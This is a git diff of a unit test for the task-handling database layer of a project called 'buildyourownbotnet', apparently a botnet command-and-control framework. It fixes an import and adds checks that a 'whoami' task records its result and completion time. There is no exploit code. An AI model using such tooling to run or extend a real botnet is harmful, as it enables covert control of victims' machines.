@@ -5,7 +5,7 @@ from datetime import datetime
 from buildyourownbotnet import app, db, bcrypt
 from buildyourownbotnet.core import dao
 from buildyourownbotnet.models import User, Session, Task
-from ..conftests import new_user, new_session
+from ..conftest import new_user, new_session
 
 def test_handle_session(new_user):
     """
@@ -66,7 +66,7 @@ def test_handle_send_task(new_session):
     check that the task is issued a UID, an issued timestamp, 
     and the metadata is stored in the database correctly.
     """
-    # create sample task
+    # create new task
     input_task_dict = {
         "session": new_session.uid,
         "task": "whoami",
@@ -83,6 +83,19 @@ def test_handle_send_task(new_session):
     assert task.task == 'whoami'
     assert (datetime.utcnow() - task.issued).seconds <= 2
     
+    # update completed task
+    output_task_dict['result'] = 'test_result'
+    completed_task_dict = dao.handle_task(input_task_dict)
+
+    # run tests
+    task_query = Task.query.filter_by(session=new_session.uid)
+    assert len(task_query.all()) == 1
+
+    task = task_query.first()
+    assert task.result == 'test_result'
+    assert task.completed is not None
+    assert (datetime.utcnow() - task.completed).seconds <= 5
+
     # clean up
     task_query.delete()
     db.session.commit()
